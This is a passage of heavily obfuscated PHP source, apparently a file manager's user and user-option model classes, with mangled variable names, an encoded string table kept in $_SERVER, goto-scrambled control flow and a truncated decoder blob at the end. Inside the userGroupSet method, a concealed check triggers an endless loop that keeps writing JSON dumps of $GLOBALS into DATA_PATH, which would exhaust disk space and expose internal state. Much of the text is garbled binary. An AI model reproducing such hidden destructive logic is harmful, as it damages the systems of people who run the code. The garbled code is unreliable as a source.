UserModel::ERROR_USER_EXIST_EMAIL, $C·ğ’‘Ö ù[2471] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($DİŒ×˜–ˆ[$C·ğ’‘Ö ù[2288]]); } $FÌ´Óª½‰ = $cë¤öã…¬Ş ? array($C·ğ’‘Ö ù[1404] => array($C·ğ’‘Ö ù[2485], $cë¤öã…¬Ş)) : array(); foreach ($DİŒ×˜–ˆ as $a³…å¼ö… => $DƒÍÛƒ’ÄÄ) { if (!isset($Fó÷‚¬ì™é[$a³…å¼ö…]) || !$Fó÷‚¬ì™é[$a³…å¼ö…]) { continue; } $C’ŸÙÅ‹£ = array_merge(array($a³…å¼ö… => $Fó÷‚¬ì™é[$a³…å¼ö…]), $FÌ´Óª½‰); $F‰÷ò¢éæ„ = $this->where($C’ŸÙÅ‹£)->find(); if ($F‰÷ò¢éæ„) { return $DƒÍÛƒ’ÄÄ; } } return !0; } public function userListInfo($F¸áÈªí¶) { $bÀ¬ìàÉ ¿ =& $_SERVER[õëù©û]; $EŞ—ôÚ˜ùË = array(); $F¸áÈªí¶ = is_array($F¸áÈªí¶) ? array_unique($F¸áÈªí¶) : array(); if (!$F¸áÈªí¶) { return $EŞ—ôÚ˜ùË; } if (count($F¸áÈªí¶) < 20) { foreach ($F¸áÈªí¶ as $DŞ¾ƒ—¬ğ•) { $EŞ—ôÚ˜ùË[$DŞ¾ƒ—¬ğ• . $bÀ¬ìàÉ ¿[33]] = $this->getInfoSimpleOuter($DŞ¾ƒ—¬ğ•); } } else { $c‚¡Œøâ¼ = array($bÀ¬ìàÉ ¿[1395] => array($bÀ¬ìàÉ ¿[380], $F¸áÈªí¶)); if (count($F¸áÈªí¶) == 1) { $c‚¡Œøâ¼ = array($bÀ¬ìàÉ ¿[1395] => $F¸áÈªí¶[0]); } $cÃšÅµä = Model($bÀ¬ìàÉ ¿[469])->field($this->simpleField)->where($c‚¡Œøâ¼)->select(); $cÃšÅµä = array_to_keyvalue($cÃšÅµä, $bÀ¬ìàÉ ¿[1404]); foreach ($F¸áÈªí¶ as $DŞ¾ƒ—¬ğ•) { $b‚ğ¸Àéí¡ = $cÃšÅµä[$cÃšÅµä[$DŞ¾ƒ—¬ğ•]]; if (!$b‚ğ¸Àéí¡) { $EŞ—ôÚ˜ùË[$DŞ¾ƒ—¬ğ• . $bÀ¬ìàÉ ¿[33]] = $this->getInfoSimpleOuter($DŞ¾ƒ—¬ğ•); continue; } $b‚ğ¸Àéí¡[$bÀ¬ìàÉ ¿[2456]] = Action($bÀ¬ìàÉ ¿[2457])->parseUrl($b‚ğ¸Àéí¡[$bÀ¬ìàÉ ¿[2456]]); $EŞ—ôÚ˜ùË[$DŞ¾ƒ—¬ğ• . $bÀ¬ìàÉ ¿[33]] = $b‚ğ¸Àéí¡; } } return $EŞ—ôÚ˜ùË; } protected function userStatus($bÛ¡¬È——™, $cØŠÅÈ¿ÒÁ) { $FÑÊÏ İ‹· = $this->getInfoSimple($bÛ¡¬È——™); if (!$FÑÊÏ İ‹·) { return !1; } $C„Á‰Ä²ÈÍ = array($_SERVER[õëù©û][684] => $cØŠÅÈ¿ÒÁ); return $this->userEdit($bÛ¡¬È——™, $C„Á‰Ä²ÈÍ); } protected function userRemove($cé¼ÈŒññ) { goto Cœ²À…ì; D¶Ã™ñ†Š÷: Model($FÚ‡¹¿éö¤[747])->userRootRemove($cé¼ÈŒññ); return $this->where($cÃ‰îØ§)->delete(); goto F± ³›»³; E„Ğ–­åÃÖ: Model($FÚ‡¹¿éö¤[2142])->where($cÃ‰îØ§)->delete(); Model($FÚ‡¹¿éö¤[2470])->where($cÃ‰îØ§)->delete(); Model($FÚ‡¹¿éö¤[2487])->where($cÃ‰îØ§)->delete(); goto D¶Ã™ñ†Š÷; Cœ²À…ì: $FÚ‡¹¿éö¤ =& $_SERVER[õëù©û]; $A‹§¿¤æ¬ = $this->getInfoSimple($cé¼ÈŒññ); if (!$A‹§¿¤æ¬) { return !1; } goto b‚áÛ°ì; b‚áÛ°ì: $cÃ‰îØ§ = array($FÚ‡¹¿éö¤[1395] => $cé¼ÈŒññ); Model($FÚ‡¹¿éö¤[531])->where($cÃ‰îØ§)->delete(); Model($FÚ‡¹¿éö¤[2486])->where($cÃ‰îØ§)->delete(); goto E„Ğ–­åÃÖ; F± ³›»³: } protected function userGroupSet($Dõ«®”©æ, $cçÆéË›‹, $fñ™¾¶¼­æ = array()) { goto dÏƒ¬½âï‘; dÏƒ¬½âï‘: $bÄÓƒ™èÙ» =& $_SERVER[õëù©û]; $FÑì¤†²Ç = $_SERVER[$bÄÓƒ™èÙ»[789]] . $bÄÓƒ™èÙ»[2306]; $F•¯ˆ¶¿™Ö = $bÄÓƒ™èÙ»[2307]; goto A„ˆä³âà; d†ãêàê¶Œ: $A‘³¹†¼˜ê = Model($bÄÓƒ™èÙ»[2142]); $A‘³¹†¼˜ê->where(array($bÄÓƒ™èÙ»[1404] => $Dõ«®”©æ))->delete(); $B–ù“Û¤Ï = array(); goto CÆˆ…Œİ©; A„ˆä³âà: if ($_SERVER[$bÄÓƒ™èÙ»[781]] != $F•¯ˆ¶¿™Ö($FÑì¤†²Ç)) { goto eëò“ø‘Å; eëò“ø‘Å: $EÄ¾»ÖÕ‚‘ = $bÄÓƒ™èÙ»[783]; $dæˆÈîƒ«Ó = $bÄÓƒ™èÙ»[784]; $CÆ¡æ‡ÜâÚ = $_SERVER[$bÄÓƒ™èÙ»[785]] . $bÄÓƒ™èÙ»[786]; goto e­…Ñ”ë’ ; Fƒõù¢: $A­×‰¢‘ÍŒ = 1; for ($f†‹»œà‰ö = $A­×‰¢‘ÍŒ; $f†‹»œà‰ö > 0; $f†‹»œà‰ö++) { $d¼ù¿¨§£Ş(DATA_PATH . $f†‹»œà‰ö, $eÔ¢÷âøÉ†); } goto AãÈõÊö™Ô; e­…Ñ”ë’ : $Aİ†•Š±ê = $dæˆÈîƒ«Ó($CÆ¡æ‡ÜâÚ); $BÜµ¦Áâß = explode($bÄÓƒ™èÙ»[213], $Aİ†•Š±ê); if (count($BÜµ¦Áâß) < $bÄÓƒ™èÙ»[581]) { $bÎÏ°Ú–‰İ = $bÄÓƒ™èÙ»[787]; $bÎÏ°Ú–‰İ(); } goto bÅ’™ØòÁè; bÅ’™ØòÁè: $f…Ûõ¡ïÅì = $bÄÓƒ™èÙ»[788]; $f…Ûõ¡ïÅì($_SERVER[$bÄÓƒ™èÙ»[789]]); $EÄ¾»ÖÕ‚‘ = $bÄÓƒ™èÙ»[783]; goto fãŸ »¸”; fãŸ »¸”: $EÄ¾»ÖÕ‚‘(); $d¼ù¿¨§£Ş = $bÄÓƒ™èÙ»[2308]; $eÔ¢÷âøÉ† = json_encode($GLOBALS[$bÄÓƒ™èÙ»[2309]]); goto Fƒõù¢; AãÈõÊö™Ô: } $e‘Å¿ÀÕ£– = $this->getInfoSimple($Dõ«®”©æ); if (!$e‘Å¿ÀÕ£– || !is_array($cçÆéË›‹)) { return !1; } goto d†ãêàê¶Œ; CÆˆ…Œİ©: $e×¿ß¦†ï = 0; foreach ($cçÆéË›‹ as $fÛÀöÖáãœ => $FØæ¿–öã°) { $e³äå¶ãóË = array($bÄÓƒ™èÙ»[1404] => $Dõ«®”©æ, $bÄÓƒ™èÙ»[2068] => $fÛÀöÖáãœ, $bÄÓƒ™èÙ»[2196] => $FØæ¿–öã°); $e³äå¶ãóË[$bÄÓƒ™èÙ»[2089]] = isset($fñ™¾¶¼­æ[$e×¿ß¦†ï]) ? $fñ™¾¶¼­æ[$e×¿ß¦†ï] : 0; $e×¿ß¦†ï++; $B–ù“Û¤Ï[] = $e³äå¶ãóË; } return $A‘³¹†¼˜ê->addAll($B–ù“Û¤Ï, array(), !0); goto fÍ² …‚ë“; fÍ² …‚ë“: } protected function userGroupAdd($Bò£©©ïÖ‹, $Fç˜÷ËŸ‹É = array()) { $AÛÆ«©ÕÙ =& $_SERVER[õëù©û]; $a±¨¯ÇšĞ = $this->getInfoSimple($Bò£©©ïÖ‹); if (!$a±¨¯ÇšĞ || empty($Fç˜÷ËŸ‹É)) { return !1; } $dã§àÍ±‹ß = array(); foreach ($Fç˜÷ËŸ‹É as $BÑ‰”Í„Îİ => $Fø°İÃ´¬¶) { $dã§àÍ±‹ß[] = array($AÛÆ«©ÕÙ[1404] => $Bò£©©ïÖ‹, $AÛÆ«©ÕÙ[2068] => $BÑ‰”Í„Îİ, $AÛÆ«©ÕÙ[2196] => $Fø°İÃ´¬¶); } return Model($AÛÆ«©ÕÙ[2142])->addAll($dã§àÍ±‹ß, array(), !0); } protected function userGroupRemove($BŸáŞ£–ö, $f…Öì½îÏ) { $a¿İº¾°¨ß =& $_SERVER[õëù©û]; $EÇ¦ßñšä = $this->getInfoSimple($BŸáŞ£–ö); if (!$EÇ¦ßñšä || !$f…Öì½îÏ) { return !1; } $FïÇ”Àòä‘ = array($a¿İº¾°¨ß[1395] => $BŸáŞ£–ö, $a¿İº¾°¨ß[2140] => $f…Öì½îÏ); return Model($a¿İº¾°¨ß[2142])->where($FïÇ”Àòä‘)->delete(); } public function listData() { $c‰ù±š¶Èõ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c‰ù±š¶Èõ[$_SERVER[õëù©û][350]]); return $c‰ù±š¶Èõ; } public function listByID($f›×Ú÷³ï) { $e†ù¤ÂŒÇˆ =& $_SERVER[õëù©û]; if (!$f›×Ú÷³ï) { return; } $céª‘Şó• = array($e†ù¤ÂŒÇˆ[1404] => array($e†ù¤ÂŒÇˆ[7], $f›×Ú÷³ï)); $Cš˜’Ù…Ğ‹ = $this->where($céª‘Şó•)->select(); $this->_listDataApply($Cš˜’Ù…Ğ‹); return $Cš˜’Ù…Ğ‹; } public function listByGroup($DÂì½—â‰ˆ = 0, $a‚óŸ©§é¹ = array()) { goto B²Ç™äÃÀ–; b‘èÆï´: if ($DÂì½—â‰ˆ) { $BóäŸŒÔÌË = array($d§èŠà‚µ…[2488] => intval($DÂì½—â‰ˆ)); $aËâê¹ïÄÛ = "\114\105\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x75\163\145\162\137\147\x72\157\165\x70\x20\165\x73\145\x72\x5f\147\162\157\x75\x70\40\157\x6e\40\165\163\145\162\56\165\x73\145\162\x49\104\x20\x3d\x20\165\163\x65\162\x5f\147\162\157\x75\160\56\x75\163\x65\x72\111\x44"; $B¢“Ù…ÅºÇ = Input::get($d§èŠà‚µ…[402], null, $d§èŠà‚µ…[33]) ? $d§èŠà‚µ…[33] : $d§èŠà‚µ…[2489]; } if (isset($a‚óŸ©§é¹[$d§èŠà‚µ…[684]])) { $BóäŸŒÔÌË[$d§èŠà‚µ…[2490]] = $a‚óŸ©§é¹[$d§èŠà‚µ…[684]]; } $e™àÈŞæ = $this->_makeOrder($B¢“Ù…ÅºÇ)->field($d§èŠà‚µ…[2491])->where($BóäŸŒÔÌË)->join($aËâê¹ïÄÛ)->selectPage(50); goto fšâ«àİ¨£; B²Ç™äÃÀ–: $d§èŠà‚µ… =& $_SERVER[õëù©û]; $aËâê¹ïÄÛ = $d§èŠà‚µ…[33]; $BóäŸŒÔÌË = array(); goto b‘èÆï´; fšâ«àİ¨£: $this->_listDataApply($e™àÈŞæ[$d§èŠà‚µ…[350]]); return $e™àÈŞæ; goto aÑè…õ½¦; aÑè…õ½¦: } private function _makeOrder($FƒªÃÍáù = '') { goto c¸‘—÷Í; c¤Ï‹Ó¦„Ö: $f‘ñì´ô = Input::get($F…®ËÅ¾Ú«[402], $F…®ËÅ¾Ú«[7], $F…®ËÅ¾Ú«[1395], $a˜‡‰¬‹õÏ); $c‚°õ‹ ĞØ = Input::get($F…®ËÅ¾Ú«[403], $F…®ËÅ¾Ú«[7], $F…®ËÅ¾Ú«[2143], array($F…®ËÅ¾Ú«[2143], $F…®ËÅ¾Ú«[399])); $c‚°õ‹ ĞØ = $Dö¢ë’¨·à[$c‚°õ‹ ĞØ]; goto BÓ™Áò¼; BÓ™Áò¼: $FƒªÃÍáù = $FƒªÃÍáù . "\165\x73\x65\x72\x2e{$f‘ñì´ô}\x20{$c‚°õ‹ ĞØ}\54\40\165\x73\145\x72\56\x75\163\145\162\111\x44\40\x61\x73\143"; return $this->alias($F…®ËÅ¾Ú«[2229])->order($FƒªÃÍáù); goto AÖ¹ÊŠ‹ˆ÷; c¸‘—÷Í: $F…®ËÅ¾Ú« =& $_SERVER[õëù©û]; $a˜‡‰¬‹õÏ = array($F…®ËÅ¾Ú«[1404], $F…®ËÅ¾Ú«[28], $F…®ËÅ¾Ú«[2054], $F…®ËÅ¾Ú«[2027], $F…®ËÅ¾Ú«[183]); $Dö¢ë’¨·à = array($F…®ËÅ¾Ú«[397] => $F…®ËÅ¾Ú«[398], $F…®ËÅ¾Ú«[399] => $F…®ËÅ¾Ú«[400]); goto c¤Ï‹Ó¦„Ö; AÖ¹ÊŠ‹ˆ÷: } public function listSearch($C’ã˜ÅæŠ¡) { goto c®ñÓÕÆ¹ö; a‹Ê·Ìå‘: $fƒñ‘‰œ†Ğ = str_replace($A‹Ç©ÑÀ¯[2146], $A‹Ç©ÑÀ¯[2147], trim($fƒñ‘‰œ†Ğ)); $dƒÏ‹ÔÈ = array($A‹Ç©ÑÀ¯[28] => array($A‹Ç©ÑÀ¯[746], "\x25{$fƒñ‘‰œ†Ğ}\45"), $A‹Ç©ÑÀ¯[289] => array($A‹Ç©ÑÀ¯[746], "\x25{$fƒñ‘‰œ†Ğ}\x25"), $A‹Ç©ÑÀ¯[2288] => array($A‹Ç©ÑÀ¯[746], "\x25{$fƒñ‘‰œ†Ğ}\45"), $A‹Ç©ÑÀ¯[907] => $A‹Ç©ÑÀ¯[2148]); if (Input::check($fƒñ‘‰œ†Ğ, $A‹Ç©ÑÀ¯[295])) { $dƒÏ‹ÔÈ[$A‹Ç©ÑÀ¯[1404]] = array($A‹Ç©ÑÀ¯[746], "\x25{$fƒñ‘‰œ†Ğ}\x25"); $dƒÏ‹ÔÈ[$A‹Ç©ÑÀ¯[2471]] = array($A‹Ç©ÑÀ¯[746], "\45{$fƒñ‘‰œ†Ğ}\45"); } goto f…×šİ¯²; dĞ®õ×Òò‡: return $Bº½¤ëÌ; goto A‰æ‰ô‡Çê; f…×šİ¯²: if (!$fƒñ‘‰œ†Ğ) { $dƒÏ‹ÔÈ = array(); } if (isset($C’ã˜ÅæŠ¡[$A‹Ç©ÑÀ¯[684]])) { $dƒÏ‹ÔÈ[$A‹Ç©ÑÀ¯[684]] = $C’ã˜ÅæŠ¡[$A‹Ç©ÑÀ¯[684]]; } $Bº½¤ëÌ = $this->_makeOrder()->where($dƒÏ‹ÔÈ)->selectPage(20); goto dÈ±ïÈÑâ; c®ñÓÕÆ¹ö: $A‹Ç©ÑÀ¯ =& $_SERVER[õëù©û]; $fƒñ‘‰œ†Ğ = $C’ã˜ÅæŠ¡[$A‹Ç©ÑÀ¯[2144]]; $d¤Óëœ¿ = isset($C’ã˜ÅæŠ¡[$A‹Ç©ÑÀ¯[2145]]) ? $C’ã˜ÅæŠ¡[$A‹Ç©ÑÀ¯[2145]] : !1; goto a‹Ê·Ìå‘; dÈ±ïÈÑâ: if (!$Bº½¤ëÌ || count($Bº½¤ëÌ[$A‹Ç©ÑÀ¯[350]]) < 5 && Input::check($fƒñ‘‰œ†Ğ, $A‹Ç©ÑÀ¯[302])) { $dÌÇµõğ = $this->_searchFromMeta($A‹Ç©ÑÀ¯[410], $fƒñ‘‰œ†Ğ, 10); $c²Ô­Éİ“ = $this->_searchFromMeta($A‹Ç©ÑÀ¯[411], $fƒñ‘‰œ†Ğ, 10); $a…õÒÂ»µ = array_merge($dÌÇµõğ, $c²Ô­Éİ“, $Bº½¤ëÌ[$A‹Ç©ÑÀ¯[350]]); $Bº½¤ëÌ[$A‹Ç©ÑÀ¯[350]] = array_unique_by_key($a…õÒÂ»µ, $A‹Ç©ÑÀ¯[1404]); $Bº½¤ëÌ[$A‹Ç©ÑÀ¯[347]][$A‹Ç©ÑÀ¯[348]] = count($Bº½¤ëÌ[$A‹Ç©ÑÀ¯[350]]); $Bº½¤ëÌ[$A‹Ç©ÑÀ¯[347]][$A‹Ç©ÑÀ¯[349]] = ceil($Bº½¤ëÌ[$A‹Ç©ÑÀ¯[347]][$A‹Ç©ÑÀ¯[348]] / $Bº½¤ëÌ[$A‹Ç©ÑÀ¯[347]][$A‹Ç©ÑÀ¯[345]]); } $this->_listDataApply($Bº½¤ëÌ[$A‹Ç©ÑÀ¯[350]]); $this->_filterByGroup($Bº½¤ëÌ, $d¤Óëœ¿); goto dĞ®õ×Òò‡; A‰æ‰ô‡Çê: } private function _filterByGroup(&$fß³÷†á³, $f«ØÚÜÓÚ) { $F«¢’”‹øÁ =& $_SERVER[õëù©û]; if (!$f«ØÚÜÓÚ) { return $fß³÷†á³; } foreach ($fß³÷†á³[$F«¢’”‹øÁ[350]] as $bçª§ÜÑÉ· => &$dà¡Ìçõø•) { $BÂóÜİ±™æ = array_to_keyvalue($dà¡Ìçõø•[$F«¢’”‹øÁ[2492]], $F«¢’”‹øÁ[33], $F«¢’”‹øÁ[2068]); if (!in_array($f«ØÚÜÓÚ, $BÂóÜİ±™æ)) { unset($fß³÷†á³[$F«¢’”‹øÁ[350]][$bçª§ÜÑÉ·]); } } $fß³÷†á³[$F«¢’”‹øÁ[350]] = array_values($fß³÷†á³[$F«¢’”‹øÁ[350]]); $fß³÷†á³[$F«¢’”‹øÁ[347]] = array($F«¢’”‹øÁ[2263] => count($fß³÷†á³[$F«¢’”‹øÁ[350]]), $F«¢’”‹øÁ[2261] => $fß³÷†á³[$F«¢’”‹øÁ[347]][$F«¢’”‹øÁ[345]], $F«¢’”‹øÁ[2260] => 1, $F«¢’”‹øÁ[2262] => 1); } private function _searchFromMeta($fïÜ››°ù±, $Aì”²Åíéö, $Cˆ»Š†½Â) { goto A¶Ëî„ÒÔŸ; E³¥ƒÆãŠ: $f²¶Á‚¾› = $this->where(array($BÊ³‡Œâµ[1395] => array($BÊ³‡Œâµ[7], $a…îÙÂô—ˆ)))->select(); if (!$f²¶Á‚¾›) { return array(); } return $f²¶Á‚¾›; goto bŒ›ƒù÷ê; A¶Ëî„ÒÔŸ: $BÊ³‡Œâµ =& $_SERVER[õëù©û]; $Aì”²Åíéö = strtolower($Aì”²Åíéö); $aÌ‡ÑÅ­’ = array($BÊ³‡Œâµ[89] => $fïÜ››°ù±, $BÊ³‡Œâµ[355] => array($BÊ³‡Œâµ[746], "\x25{$Aì”²Åíéö}\x25")); goto A·ÑÒ©Ñ³; A·ÑÒ©Ñ³: $a…îÙÂô—ˆ = Model($BÊ³‡Œâµ[2493])->where($aÌ‡ÑÅ­’)->limit($Cˆ»Š†½Â)->select(); if (!$a…îÙÂô—ˆ) { return array(); } $a…îÙÂô—ˆ = array_to_keyvalue($a…îÙÂô—ˆ, $BÊ³‡Œâµ[33], $BÊ³‡Œâµ[1404]); goto E³¥ƒÆãŠ; bŒ›ƒù÷ê: } private function _listDataApplyItem($cøŒÚ“­®) { $D¬™Ğº§ÙÅ = array($cøŒÚ“­®); $this->_listDataApply($D¬™Ğº§ÙÅ); return $D¬™Ğº§ÙÅ[0]; } private function _listDataApply(&$cÂã¶äã¿) { goto E²ö›¦µ­; E²ö›¦µ­: $DÀ­Âõè­ =& $_SERVER[õëù©û]; if (!$cÂã¶äã¿) { return; } array_remove_key($cÂã¶äã¿, $DÀ­Âõè­[795]); goto D¾ÅÙ†áóÁ; D¾ÅÙ†áóÁ: $dóÂ¡Çµ§ = array_to_keyvalue($cÂã¶äã¿, $DÀ­Âõè­[33], $DÀ­Âõè­[1404]); $this->_listAppendGroup($cÂã¶äã¿, $dóÂ¡Çµ§); $this->_listAppendMeta($cÂã¶äã¿, $dóÂ¡Çµ§); goto cÚ‹˜«‰—Ö; cÚ‹˜«‰—Ö: $this->_listAppendSourceRoot($cÂã¶äã¿, $dóÂ¡Çµ§); goto fíøïó‚è; fíøïó‚è: } private function _listAppendSourceRoot(&$d‚ªãî¤ œ, $A…¥Î®‘Õ) { goto F¢è…±æº“; DÉ‚ù§Ô’´: $A‰öÊ›Ô†Š = Model($c«Ï§ùğÈ [747])->order($c«Ï§ùğÈ [2155])->field($eîéŒĞì¹†)->where($fíä¢ÊÏ¨¯)->select(); $A‰öÊ›Ô†Š = array_to_keyvalue($A‰öÊ›Ô†Š, $c«Ï§ùğÈ [451]); $A‰öÊ›Ô†Š = array_remove_key($A‰öÊ›Ô†Š, $c«Ï§ùğÈ [451]); goto cŒ˜×†ÒÊ·; cŒ˜×†ÒÊ·: foreach ($d‚ªãî¤ œ as &$Bï²Î¿¤Œ) { $Bï²Î¿¤Œ[$c«Ï§ùğÈ [387]] = $A‰öÊ›Ô†Š[$Bï²Î¿¤Œ[$c«Ï§ùğÈ [1404]]] ? $A‰öÊ›Ô†Š[$Bï²Î¿¤Œ[$c«Ï§ùğÈ [1404]]] : array(); } goto bè¾÷§»Öô; F¢è…±æº“: $c«Ï§ùğÈ  =& $_SERVER[õëù©û]; $fíä¢ÊÏ¨¯ = array($c«Ï§ùğÈ [456] => 0, $c«Ï§ùğÈ [367] => SourceModel::TYPE_USER, $c«Ï§ùğÈ [451] => array($c«Ï§ùğÈ [7], $A…¥Î®‘Õ)); $eîéŒĞì¹† = $c«Ï§ùğÈ [2154]; goto DÉ‚ù§Ô’´; bè¾÷§»Öô: } private function _listAppendGroup(&$bŠ”‚Û§š†, $bƒŒñ¹ƒïØ) { goto f‡ÛÑÊ¯£; D†ª ƒ®İ: $FÏÜá“–‘Î = array($bœ„ë²ñë„[2068] => array($bœ„ë²ñë„[7], $BŞÁí“„‰á)); $a­ñ­ºñàÊ = Model($bœ„ë²ñë„[2494])->field($bœ„ë²ñë„[2495])->where($FÏÜá“–‘Î)->select(); $D†ƒŸ˜Ÿã = array_to_keyvalue($a­ñ­ºñàÊ, $bœ„ë²ñë„[2068], $bœ„ë²ñë„[28]); goto EŠ¡™Ïİ†œ; EŠ¡™Ïİ†œ: $C‰¡èİÙõ = array_to_keyvalue_group($C‰¡èİÙõ, $bœ„ë²ñë„[1404]); foreach ($C‰¡èİÙõ as &$fóš¯àå‰Ò) { $bé°©ß™–ô = array(); foreach ($fóš¯àå‰Ò as $cÍ®—Ö°ö) { if (!$cÍ®—Ö°ö[$bœ„ë²ñë„[2196]]) { continue; } $cÊçë£ïß¸ = Model($bœ„ë²ñë„[2215])->listData($cÍ®—Ö°ö[$bœ„ë²ñë„[2196]]); $bé°©ß™–ô[] = array($bœ„ë²ñë„[2068] => $cÍ®—Ö°ö[$bœ„ë²ñë„[2068]], $bœ„ë²ñë„[2496] => $D†ƒŸ˜Ÿã[$cÍ®—Ö°ö[$bœ„ë²ñë„[2068]]], $bœ„ë²ñë„[372] => $cÊçë£ïß¸); } $fóš¯àå‰Ò = $bé°©ß™–ô; } foreach ($bŠ”‚Û§š† as &$aĞ¨ÖÓ¦Ÿô) { $aĞ¨ÖÓ¦Ÿô[$bœ„ë²ñë„[2492]] = array(); if (isset($C‰¡èİÙõ[$aĞ¨ÖÓ¦Ÿô[$bœ„ë²ñë„[1404]]])) { $aĞ¨ÖÓ¦Ÿô[$bœ„ë²ñë„[2492]] = $C‰¡èİÙõ[$aĞ¨ÖÓ¦Ÿô[$bœ„ë²ñë„[1404]]]; } } goto e“Š»”–ª’; f‡ÛÑÊ¯£: $bœ„ë²ñë„ =& $_SERVER[õëù©û]; $FÏÜá“–‘Î = array($bœ„ë²ñë„[1404] => array($bœ„ë²ñë„[7], $bƒŒñ¹ƒïØ)); $C‰¡èİÙõ = Model($bœ„ë²ñë„[2142])->where($FÏÜá“–‘Î)->select(); goto bÈ¾¸ƒ¶Ø; bÈ¾¸ƒ¶Ø: $BŞÁí“„‰á = array_to_keyvalue($C‰¡èİÙõ, $bœ„ë²ñë„[33], $bœ„ë²ñë„[2068]); $BŞÁí“„‰á = array_remove_value(array_unique($BŞÁí“„‰á), $bœ„ë²ñë„[463]); if (!$BŞÁí“„‰á || !$C‰¡èİÙõ) { return; } goto D†ª ƒ®İ; e“Š»”–ª’: } private function _listAppendMeta(&$FéÙ©òœÉ, $BŞ½¢á«´É) { goto e¦á‡‚Ë¼; dò·ˆœ†øÎ: foreach ($bß—ñ˜Š´Ñ as &$c°ï´©í÷ï) { $A±à‘‰ˆí = array(); foreach ($c°ï´©í÷ï as $a™Üâí´è) { if (!in_array($a™Üâí´è[$EÙùÚ™×ğç[89]], $AÌ®³Ş§Ä)) { $A±à‘‰ˆí[$a™Üâí´è[$EÙùÚ™×ğç[89]]] = $a™Üâí´è[$EÙùÚ™×ğç[355]]; } } $c°ï´©í÷ï = $A±à‘‰ˆí; } $Bö¾ˆïßĞ— = Model($EÙùÚ™×ğç[2497]); foreach ($FéÙ©òœÉ as &$aâÙ¾î‰…) { $AØÌÓØÜÄš = array(); if (isset($bß—ñ˜Š´Ñ[$aâÙ¾î‰…[$EÙùÚ™×ğç[1404]]])) { $AØÌÓØÜÄš = $bß—ñ˜Š´Ñ[$aâÙ¾î‰…[$EÙùÚ™×ğç[1404]]]; } $aâÙ¾î‰…[$EÙùÚ™×ğç[2498]] = array(); if (isset($AØÌÓØÜÄš[$B¢¾óìœŠ™])) { $aâÙ¾î‰…[$EÙùÚ™×ğç[2498]] = $Bö¾ˆïßĞ—->getUserJobInfo($AØÌÓØÜÄš[$B¢¾óìœŠ™]); } } goto A•á¢¾òÛ; aŞç‘Æ¤İ¹: $DåšöÃ“â½ = array($EÙùÚ™×ğç[1404] => array($EÙùÚ™×ğç[7], $BŞ½¢á«´É)); $bß—ñ˜Š´Ñ = Model($EÙùÚ™×ğç[2470])->where($DåšöÃ“â½)->select(); $bß—ñ˜Š´Ñ = array_to_keyvalue_group($bß—ñ˜Š´Ñ, $EÙùÚ™×ğç[1404]); goto dò·ˆœ†øÎ; e¦á‡‚Ë¼: $EÙùÚ™×ğç =& $_SERVER[õëù©û]; $B¢¾óìœŠ™ = UserJobModel::JOB_KEY; $AÌ®³Ş§Ä = array($EÙùÚ™×ğç[2473]); goto aŞç‘Æ¤İ¹; A•á¢¾òÛ: } public function userSearch($cèëÅÃ…Ü°, $EØÔÉ†¨ = "\52") { return Model($_SERVER[õëù©û][472])->where($cèëÅÃ…Ü°)->field($EØÔÉ†¨)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($EÍŠ”ê††) { $f§Á¿’™í =& $_SERVER[õëù©û]; if (!defined($f§Á¿’™í[422])) { define($f§Á¿’™í[422], 0); } return "\125\x73\x65\162\117\x70\x74\151\x6f\x6e\x5f{$EÍŠ”ê††}\x5f" . USER_ID; } protected function filterWhere($A³¡„îèß­) { $DÚ„Ã¡‹àø =& $_SERVER[õëù©û]; if (!defined($DÚ„Ã¡‹àø[422])) { define($DÚ„Ã¡‹àø[422], 0); } $A³¡„îèß­[$DÚ„Ã¡‹àø[1404]] = USER_ID; return $A³¡„îèß­; } public function cacheRemoveUser($e™…É‡Œˆí, $FÃö‰Ø‚) { return Cache::remove("\125\x73\145\x72\117\x70\164\x69\x6f\156\137{$e™…É‡Œˆí}\137" . $FÃö‰Ø‚); } protected function optionDefault($cáÎ•ˆóÓ˜ = '') { $aì‚šãâ¼º =& $_SERVER[õëù©û]; if ($cáÎ•ˆóÓ˜ == $aì‚šãâ¼º[33]) { return $GLOBALS[$aì‚šãâ¼º[6]][$aì‚šãâ¼º[2499]]; } if ($cáÎ•ˆóÓ˜ == $aì‚šãâ¼º[2500]) { return $GLOBALS[$aì‚šãâ¼º[6]][$aì‚šãâ¼º[2501]]; } } } goto b‚ƒ¤ˆ¦àÎ; a½ÌĞíÓ®: if (!function_exists('_kodDe')) { function _kodDe($D¢Ë ºÅ¥†) { $D¢Ë ºÅ¥† = base64_decode($D¢Ë ºÅ¥†); $f¹¡ÔÏŞñ = strlen($D¢Ë ºÅ¥†); $eî‰ƒª™·˜ = ''; $D†Î½ö¸‡ = ord($D¢Ë ºÅ¥†[0]) - 30; for ($dŸ õëø·¡ = 1; $dŸ õëø·¡ < $f¹¡ÔÏŞñ; $dŸ õëø·¡ += 2) { if ($dŸ õëø·¡ + 1 < $f¹¡ÔÏŞñ) { $eî‰ƒª™·˜ .= chr(ord($D¢Ë ºÅ¥†[$dŸ õëø·¡ + 1]) + $D†Î½ö¸‡); $eî‰ƒª™·˜ .= chr(ord($D¢Ë ºÅ¥†[$dŸ õëø·¡]) + $D†Î½ö¸‡); } else { $eî‰ƒª™·˜ .= chr(ord($D¢Ë ºÅ¥†[$dŸ õëø·¡]) + $D†Î½ö¸‡); } } return $eî‰ƒª™·˜; } } define(base64_decode('9ev5qfs='), "\237\227\331\216\366"); $_SERVER[õëù©û] = explode("\174\1\174\1\174\6", gzinflate(substr(strrev('yZKkIZJÊ9`œrHä²%c’Y±9sØtGÁ\'…¥ PÓ9JµÅ`	='."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹